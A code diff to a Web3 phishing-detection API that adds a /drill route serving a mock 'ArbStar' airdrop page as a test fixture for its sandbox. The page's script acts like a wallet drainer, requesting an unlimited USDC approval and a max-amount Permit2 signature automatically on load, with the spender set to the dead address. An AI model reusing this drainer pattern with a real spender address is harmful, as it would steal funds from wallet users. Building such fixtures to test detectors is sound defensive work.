@@ -673,6 +673,60 @@ function adminAuthed(req: Request, env: Env): boolean {
   return !!env.ADMIN_TOKEN && timingSafeEqual(token, env.ADMIN_TOKEN);
 }
 
+// A harmless "fake airdrop" fixture for demonstrating the server-side sandbox. It behaves like a drain-on-connect
+// page (unlimited USDC approval + Permit2, both to a dead address) so the sandbox records and scores it, but it
+// never looks like a known brand and is not on any blocklist, so client heuristics alone say little — only the
+// sandbox, which opens it with a throw-away wallet, reveals the intent. Nothing can move: the spender is 0x…dEaD
+// and the sandbox observer rejects every request. Served at GET /drill for the demo.
+const DRILL_PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ArbStar Token Claim</title>
+<style>
+:root{color-scheme:dark}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(1200px 600px at 50% -10%,#1b2a4a,#0a0e17);font:16px/1.5 system-ui,Segoe UI,Roboto,sans-serif;color:#e8eefc}
+.card{width:min(440px,92vw);background:#121829;border:1px solid #27324d;border-radius:18px;padding:30px 28px;box-shadow:0 30px 80px rgba(0,0,0,.5);text-align:center}
+.logo{width:56px;height:56px;border-radius:14px;margin:0 auto 14px;background:conic-gradient(from 210deg,#4f8cff,#9b6bff,#4f8cff);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:24px;color:#fff}
+h1{margin:.2em 0 .1em;font-size:22px}
+.sub{color:#9fb0d0;margin:0 0 6px}
+.amt{font-size:32px;font-weight:800;margin:14px 0 2px;background:linear-gradient(90deg,#6ea8ff,#b78bff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.tick{color:#7fd1a6;font-size:13px;margin-bottom:18px}
+button{width:100%;padding:14px 16px;border:0;border-radius:12px;font:inherit;font-weight:700;color:#fff;background:linear-gradient(90deg,#3a7bff,#8257ff);cursor:pointer}
+.note{font-size:12px;color:#7d8aa8;margin-top:14px}
+pre{text-align:left;background:#0c111d;border:1px solid #1e283f;border-radius:10px;padding:10px;margin-top:16px;font-size:12px;color:#8aa0c8;white-space:pre-wrap;max-height:120px;overflow:auto}
+.warn{margin-top:14px;font-size:11px;color:#5e6b85}
+</style></head><body>
+<div class="card">
+  <div class="logo">A</div>
+  <h1>ArbStar Airdrop</h1>
+  <p class="sub">You are eligible to claim</p>
+  <div class="amt">5,000 ARBS</div>
+  <div class="tick">&#9873; Claim window closes in 02:58:14</div>
+  <button id="claim">Claim airdrop</button>
+  <p class="note">Connect your wallet to verify eligibility and claim your allocation.</p>
+  <pre id="log" hidden></pre>
+  <div class="warn">Test fixture for Web3 Phish Guard. Harmless: spender is 0x&#8230;dEaD, nothing can move.</div>
+</div>
+<script>
+(function(){
+  var DEAD="0x000000000000000000000000000000000000dEaD";
+  var USDC="0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
+  var MAX="f".repeat(64);
+  var pad=function(h){return h.replace(/^0x/,"").padStart(64,"0")};
+  var logEl=document.getElementById("log");
+  function log(m){logEl.hidden=false;logEl.textContent+=m+"\n"}
+  function drain(){
+    var eth=window.ethereum;
+    if(!eth){log("No wallet detected.");return}
+    eth.request({method:"eth_requestAccounts"}).then(function(a){
+      var acct=a&&a[0];log("Connected "+acct);
+      eth.request({method:"eth_sendTransaction",params:[{from:acct,to:USDC,data:"0x095ea7b3"+pad(DEAD)+MAX}]}).catch(function(e){log("approve rejected ("+(e&&e.code)+")")});
+      var td=JSON.stringify({primaryType:"PermitSingle",domain:{name:"Permit2"},message:{details:{token:USDC,amount:"0x"+MAX},spender:DEAD,sigDeadline:"0x"+MAX}});
+      eth.request({method:"eth_signTypedData_v4",params:[acct,td]}).catch(function(e){log("permit rejected ("+(e&&e.code)+")")});
+    }).catch(function(e){log("connect: "+(e&&e.message||e))});
+  }
+  document.getElementById("claim").addEventListener("click",drain);
+  setTimeout(drain,900);
+})();
+</script></body></html>`;
+
 const ADMIN_SHELL = `<!doctype html><meta charset="utf-8"><title>W3PG moderation</title>
 <style>body{font:14px system-ui;margin:24px;background:#111;color:#eee}table{border-collapse:collapse;width:100%}td,th{border:1px solid #333;padding:8px;vertical-align:top}button{margin-right:6px}code{color:#ffd27a}input{font:inherit;padding:6px;width:360px}</style>
 <h1>W3PG moderation</h1>
@@ -913,6 +967,7 @@ export default {
     if (req.method === "POST" && url.pathname === "/admin/decide") return handleDecide(req, env);
     if (req.method === "POST" && url.pathname === "/admin/add") return handleAdminAdd(req, env);
     if (req.method === "GET" && url.pathname === "/admin/export") return handleAdminExport(req, env);
+    if (req.method === "GET" && url.pathname === "/drill") return new Response(DRILL_PAGE, { headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store", "x-robots-tag": "noindex" } });
     if (req.method === "GET" && url.pathname === "/") return json({ ok: true, service: "web3-phish-guard-api" });
     return json({ error: "not_found" }, 404);
   },
